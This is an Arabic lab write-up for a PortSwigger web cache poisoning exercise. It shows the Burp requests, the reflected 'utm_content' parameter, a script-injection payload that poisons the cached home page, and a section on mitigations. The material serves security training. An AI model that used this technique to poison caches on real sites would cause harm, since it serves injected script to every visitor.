# [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)

## **`الهدف`**
قم بتسميم الصفحة الرئيسية باستجابة تقوم بتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a15008203b76817802dd0280071003f.web-security-academy.net
Cookie: session=J9g6gweQ2aRRHRskV8ZLF5GCchOWF6Hq
```
بعد ذلك سنستعمل خيار `Guess query params` في إضافة `Param Miner` لنكتشف أن اللاب يدعم `utm_content` كمعلم غير مفهرس ويعكسها في الاستجابة، كمثال الطلب التالي:
```http
GET /?utm_content=TESTTEST HTTP/2
Host: 0a15008203b76817802dd0280071003f.web-security-academy.net
Cookie: session=J9g6gweQ2aRRHRskV8ZLF5GCchOWF6Hq
```
تكون الاستجابة كالتالي:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: utm_content=%27%3e%3cscript%3ealert%281%29%3c%2fscript%3e; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 11787

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0a15008203b76817802dd0280071003f.web-security-academy.net/?utm_content='><script>alert(1)</script>'/>
        <title>Web cache poisoning via an unkeyed query parameter</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning via an unkeyed query parameter</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aWeb+cache+poisoning+via+an+unkeyed+query+parameter%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-param&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-param'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/12.jpg"></a>
                        <h2>It's All Just A Click Away</h2>
                        <p>What I love most about Social Media is how it fills my days. Time just evaporates with every word I read, every video I watch and every pointless self-analyzing quiz I take part in. I used to tell people I...</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/44.jpg"></a>
                        <h2>If I Close My Eyes You Can't See Me</h2>
                        <p>A young man in Ohio was shocked to discover his Mom and Grandma had been witness to his inappropriate online behavior. Forgetting how everyone you have in your friendship circle is inextricably connected on social media, he didn't hold back...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/63.jpg"></a>
                        <h2>Shopping Woes</h2>
                        <p>I'm one of those really annoying people you don't want to get stuck behind in the grocery store. I love to chat, and boy can I chat, to the cashier. My money is always at the bottom of my rucksack,...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/42.jpg"></a>
                        <h2>Watching Me, Watching You.</h2>
                        <p>For all you people who work from home, there's a new app that will help you stop procrastinating and focus on your goals. The trusty webcam has been put to use as you sign up with a work buddy. You...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/30.jpg"></a>
                        <h2>Benefits of Travelling</h2>
                        <p>Travelling is such an emotive word. It can excite some, scare others and conjure images of grubby millennials backpacking around the far reaches of the earth for a few. It is however, a word that can mean whatever it is...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/7.jpg"></a>
                        <h2>Faking It! - InstaCam</h2>
                        <p>People are going to extreme lengths to pull the wool over their friends' eyes on Social Media. If you've ever clicked your way through family photos and the perfect summer and winter getaway pics of your friends on Instagram then...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/41.jpg"></a>
                        <h2>The Hating Dating App</h2>
                        <p>I saw a headline the other day about the launch of a dating app that matches people based on the things they hate. I didn't read the article as I wanted to work out for myself how that could possibly...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/32.jpg"></a>
                        <h2>A Guide to Online Dating</h2>
                        <p>Let's face it, it's a minefield out there. That's not even just a reference to dating, the planet right now is more or less a minefield. In a world where cats have their own YouTube channels and a celebrity can...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/2.jpg"></a>
                        <h2>21st Century Dreaming</h2>
                        <p>Despite the number of differences in lifestyle between us humans, we can all have dreams with similar themes. I have very vivid dreams which appear like full-length movies. I have noticed changes as society and technology evolves.</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
وبعد ذلك سنقوم بحقن أمر `alert` في معلم `utm_content`
```http
GET /?utm_content='/><script>alert(1)</script> HTTP/2
Host: 0a15008203b76817802dd0280071003f.web-security-academy.net
Cookie: session=J9g6gweQ2aRRHRskV8ZLF5GCchOWF6Hq
```

وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب إعداد سيرفر ذاكرة التخزين المؤقت ليقوم بتضمين الـ `Query String` بالكامل (أو المعلمات الهامة فقط) ضمن مفتاح الكاش.

وإذا كان التطبيق لا يحتاج فعلياً إلى معلمات عشوائية فيجب إعداد الـ `WAF` أو سيرفر الـ `CDN` ليقوم بتعقيم أي `Query Parameters` غير مدرجة في القائمة البيضاء `Whitelist` قبل تمرير الطلب إلى السيرفر.

ويجب على السيرفر تطبيق آلية ترميز المخرجات `Output Encoding` لتحويل رموز `HTML` الخاصة إلى نصوص آمنة، فحتى لو تمكن المهاجم من إرسال كود `XSS` خبيث، سيتدخل المتصفح ويعرضه كنص مقروء ويمنع تنفيذ الـ `alert(1)` بفضل هذا الترميز.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناءً على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم الترميز التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدوياً، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة، ولكن يجب التأكيد على أن محرك القوالب يجب أن يدعم `Context-Aware Auto-escaping`

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجياً، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` فحتى لو فشل السيرفر في فلترة البيانات، سيتدخل المتصفح ويمنع تنفيذ الـ `alert()` بفضل هذه السياسة.

وكخطوة أمان إضافية، بالرغم من أنها لن تمنع هذه الثغرة،يجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
